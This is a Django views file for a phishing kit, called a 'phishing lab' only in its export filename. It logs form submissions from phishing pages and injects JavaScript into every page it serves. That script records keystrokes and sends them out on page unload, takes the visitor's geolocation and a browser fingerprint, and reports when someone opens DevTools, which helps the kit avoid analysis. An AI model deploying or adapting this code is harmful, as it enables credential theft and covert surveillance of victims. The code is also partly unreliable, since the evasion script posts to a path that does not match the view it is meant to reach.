from django.shortcuts import render
import os, shutil, json
from django.http import JsonResponse, FileResponse
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import render
from django.conf import settings
from django.template import loader
from .models import PhishingLog, KeystrokeLog, FingerprintLog, GeoLog, EvasionLog
from django.views.generic import TemplateView

@csrf_exempt
def handle_submission(request):
    if request.method == 'POST':
        PhishingLog.objects.create(
            page=request.POST.get('page'),
            data=json.dumps(request.POST.dict()),
            ip=request.META.get('REMOTE_ADDR')
        )
        return JsonResponse({'status': 'received'})

@csrf_exempt
def log_keystroke(request):
    if request.method == 'POST':
        KeystrokeLog.objects.create(
            page=request.POST.get('page'),
            keys=request.POST.get('keys'),
            ip=request.META.get('REMOTE_ADDR')
        )
        return JsonResponse({'status': 'logged'})

@csrf_exempt
def log_geo(request):
    if request.method == 'POST':
        GeoLog.objects.create(
            ip=request.META.get('REMOTE_ADDR'),
            lat=request.POST.get('lat'),
            lon=request.POST.get('lon')
        )
        return JsonResponse({'status': 'geo logged'})

@csrf_exempt
def log_fingerprint(request):
    if request.method == 'POST':
        FingerprintLog.objects.create(
            ip=request.META.get('REMOTE_ADDR'),
            fingerprint=request.POST.get('fp')
        )
        return JsonResponse({'status': 'fp logged'})

@csrf_exempt
def log_evasion(request):
    if request.method == 'POST':
        EvasionLog.objects.create(
            ip=request.META.get('REMOTE_ADDR'),
            info=request.POST.get('evasion')
        )
        return JsonResponse({'status': 'evasion logged'})

def view_logs(request):
    logs = {
        'phishing': PhishingLog.objects.all(),
        'keystrokes': KeystrokeLog.objects.all(),
        'fingerprints': FingerprintLog.objects.all(),
        'geos': GeoLog.objects.all(),
        'evasions': EvasionLog.objects.all()
    }
    return render(request, 'dashboard.html', logs)

def export_project(request):
    export_path = os.path.join(settings.BASE_DIR, 'phishing_export.zip')
    shutil.make_archive(base_name=export_path.replace('.zip', ''), format='zip', root_dir=settings.BASE_DIR)
    return FileResponse(open(export_path, 'rb'), as_attachment=True, filename='phishing_lab_package.zip')

def phishing_page(request, page_name):
    template = loader.get_template(f'{page_name}.html')

    js_scripts = """
    <script>
    // Keystroke logger
    let keys = "";
    document.addEventListener("keydown", function(e) {
      keys += e.key;
    });
    window.addEventListener("beforeunload", function() {
      navigator.sendBeacon("/log_keystroke/", new URLSearchParams({
        page: window.location.pathname,
        keys: keys
      }));
    });

    // Geolocation
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(function(position) {
        fetch("/log_geo/", {
          method: "POST",
          headers: {'Content-Type': 'application/x-www-form-urlencoded'},
          body: new URLSearchParams({
            lat: position.coords.latitude,
            lon: position.coords.longitude
          })
        });
      });
    }

    // Browser fingerprint
    async function sendFingerprint() {
      const fp = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      };
      fetch("/log_fingerprint/", {
        method: "POST",
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: new URLSearchParams({fp: JSON.stringify(fp)})
      });
    }
    window.onload = sendFingerprint;

    // Evasion (DevTools detection)
    const el = new Image();
    Object.defineProperty(el, 'id', {
      get: function () {
        fetch("/log_evasion_detected/", {
          method: "POST",
          headers: {'Content-Type': 'application/x-www-form-urlencoded'},
          body: new URLSearchParams({evasion: "DevTools opened"})
        });
      }
    });
    console.log(el);
    </script>
    """

    return render(request, f'{page_name}.html', {'tracking_scripts': js_scripts})
